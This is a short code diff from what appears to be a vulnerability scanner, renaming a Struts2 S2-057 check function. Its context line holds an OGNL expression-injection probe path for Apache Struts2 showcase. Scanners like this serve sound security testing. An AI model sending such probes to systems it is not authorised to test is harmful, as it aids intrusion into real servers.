@@ -19,7 +19,7 @@ def UrlProcessing(url):
 payload='''/struts2-showcase/$%7B233*233%7D/actionChain1.action'''
 
 
-def S2_057(Url,RandomAgent,ProxyIp):
+def medusa(Url,RandomAgent,ProxyIp):
     scheme, url, port = UrlProcessing(Url)
     if port is None and scheme == 'https':
         port = 443
